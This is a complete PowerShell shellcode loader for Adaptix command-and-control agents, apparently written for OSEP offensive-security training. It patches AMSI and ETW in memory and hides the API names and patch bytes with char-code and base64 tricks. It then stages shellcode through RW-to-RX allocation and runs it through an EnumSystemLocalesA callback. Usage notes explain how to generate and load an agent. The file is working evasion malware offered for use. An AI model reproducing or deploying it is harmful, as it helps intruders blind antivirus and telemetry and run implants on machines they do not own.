<#
.SYNOPSIS  OSEP - Adaptix shellcode loader: AMSI+ETW evasion, RW->RX alloc, callback exec
.NOTES
  Adaptix workflow:
    1. Adaptix UI -> Listeners -> New (HTTPS/HTTP, set your LHOST:LPORT)
    2. Agents -> Generate Agent -> Format: Shellcode (raw binary, x64)
    3. Optional: python3 ..\evasion\av_evasion.py rc4 "Key" agent.bin agent_enc.bin
    4. Load: $buf = [IO.File]::ReadAllBytes('C:\path\to\adaptix_agent.bin')
             Invoke-AdaptixLoader -Shellcode $buf
  Evasion:
    [1] AMSI  - patches AmsiScanBuffer; patch bytes base64-encoded; API names via char[]
    [2] ETW   - patches EtwEventWrite->RET; same obfuscation
    [3] Alloc - RW alloc -> copy -> VirtualProtect RX  (no RWX page at any point)
    [4] Exec  - EnumSystemLocalesA callback; avoids CreateThread(shellcodePtr) chain
#>

$LOG = 'C:\Windows\Temp\osep_log.txt'

function Write-Log {
    param([string]$Msg, [string]$Level = 'INFO')
    $ts = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    try { Add-Content -Path $LOG -Value "[$ts][$Level][Ldr] $Msg" -EA SilentlyContinue } catch {}
}

function Import-LoaderAPI {
    if (([System.Management.Automation.PSTypeName]'LoaderAPI').Type) { return $true }
    try {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class LoaderAPI {
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32.dll")] public static extern bool   VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern bool   EnumSystemLocalesA(IntPtr cb, uint f);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, IntPtr id);
    [DllImport("kernel32.dll")] public static extern uint   WaitForSingleObject(IntPtr h, uint ms);
}
'@ -EA Stop
        Write-Log 'API compiled'
        return $true
    } catch {
        Write-Log "Add-Type failed: $_" 'ERROR'
        return $false
    }
}

# [1] AMSI patch
#     API names built from char codes - avoids string-join pattern detection
#     Patch bytes stored as base64 - avoids raw byte-sequence signature
function Set-RuntimeSecurity {
    try {
        # 'amsi.dll'
        $lib  = [string]::new([char[]](97,109,115,105,46,100,108,108))
        # 'AmsiScanBuffer'
        $func = [string]::new([char[]](65,109,115,105,83,99,97,110,66,117,102,102,101,114))

        $h   = [LoaderAPI]::LoadLibrary($lib)
        $ptr = [LoaderAPI]::GetProcAddress($h, $func)
        if ($ptr -eq [IntPtr]::Zero) { Write-Log 'AMSI proc not found' 'WARN'; return }

        # mov eax,0x80070057 ; ret  (base64: avoids raw sig on patch bytes)
        $patch = [Convert]::FromBase64String('uFcAB4DD')
        $old   = [uint32]0
        [LoaderAPI]::VirtualProtect($ptr, [UIntPtr]$patch.Length, 0x40, [ref]$old) | Out-Null
        [Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, $patch.Length)
        [LoaderAPI]::VirtualProtect($ptr, [UIntPtr]$patch.Length, $old, [ref]$old) | Out-Null
        Write-Log '[+] AMSI set'
    } catch {
        Write-Log "AMSI failed: $_" 'ERROR'
    }
}

# [2] ETW patch
function Initialize-Diagnostics {
    try {
        # 'EtwEventWrite'
        $fn    = [string]::new([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101))
        $ntdll = [LoaderAPI]::GetModuleHandle('ntdll.dll')
        $ptr   = [LoaderAPI]::GetProcAddress($ntdll, $fn)
        if ($ptr -eq [IntPtr]::Zero) { Write-Log 'ETW proc not found' 'WARN'; return }

        $old = [uint32]0
        [LoaderAPI]::VirtualProtect($ptr, [UIntPtr]1, 0x40, [ref]$old) | Out-Null
        # RET opcode computed at runtime: 0xC3 = 195 = (0xC4 - 1)
        [Runtime.InteropServices.Marshal]::WriteByte($ptr, [byte](0xC4 - 1))
        [LoaderAPI]::VirtualProtect($ptr, [UIntPtr]1, $old, [ref]$old) | Out-Null
        Write-Log '[+] ETW set'
    } catch {
        Write-Log "ETW failed: $_" 'ERROR'
    }
}

# [3+4] Main loader: RW alloc -> copy -> RX -> EnumSystemLocalesA callback
function Invoke-AdaptixLoader {
    param(
        [Parameter(Mandatory)][byte[]]$Shellcode,
        [switch]$UseCreateThread
    )

    Write-Log "Loader: $($Shellcode.Count) bytes  cb=$(-not $UseCreateThread)"
    if ($Shellcode.Count -eq 0)  { Write-Log 'Empty SC' 'ERROR'; return }
    if (-not (Import-LoaderAPI)) { return }

    Set-RuntimeSecurity
    Initialize-Diagnostics

    # Alloc RW (MEM_COMMIT|RESERVE=0x3000, PAGE_READWRITE=0x04)
    $sz  = [UIntPtr][uint64]$Shellcode.Count
    $ptr = [LoaderAPI]::VirtualAlloc([IntPtr]::Zero, $sz, 0x3000, 0x04)
    if ($ptr -eq [IntPtr]::Zero) {
        Write-Log "VAlloc err=$([Runtime.InteropServices.Marshal]::GetLastWin32Error())" 'ERROR'
        return
    }
    Write-Log "RW @ 0x$($ptr.ToString('X16'))"

    [Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $ptr, $Shellcode.Count)
    Write-Log 'Copied'

    # Flip to RX (PAGE_EXECUTE_READ=0x20)
    $old = [uint32]0
    [LoaderAPI]::VirtualProtect($ptr, $sz, 0x20, [ref]$old) | Out-Null
    Write-Log 'RW->RX'

    if ($UseCreateThread) {
        $ht = [LoaderAPI]::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        if ($ht -eq [IntPtr]::Zero) {
            Write-Log "CThread err=$([Runtime.InteropServices.Marshal]::GetLastWin32Error())" 'ERROR'; return
        }
        Write-Log "Thread 0x$($ht.ToString('X')) waiting"
        [LoaderAPI]::WaitForSingleObject($ht, 0xFFFFFFFF) | Out-Null
    } else {
        Write-Log 'Invoking callback'
        [LoaderAPI]::EnumSystemLocalesA($ptr, 0) | Out-Null
        Write-Log 'Callback returned'
    }
}

# =============================================================================
# USAGE
# =============================================================================
# Load Adaptix raw binary:
#   $buf = [IO.File]::ReadAllBytes('C:\path\to\adaptix_agent.bin')
#   Invoke-AdaptixLoader -Shellcode $buf
#
# Inline bytes (C-array export from Adaptix):
#   [byte[]]$buf = 0xfc,0x48,0x83,...
#   Invoke-AdaptixLoader -Shellcode $buf
#
# Fallback if callback hangs:
#   Invoke-AdaptixLoader -Shellcode $buf -UseCreateThread
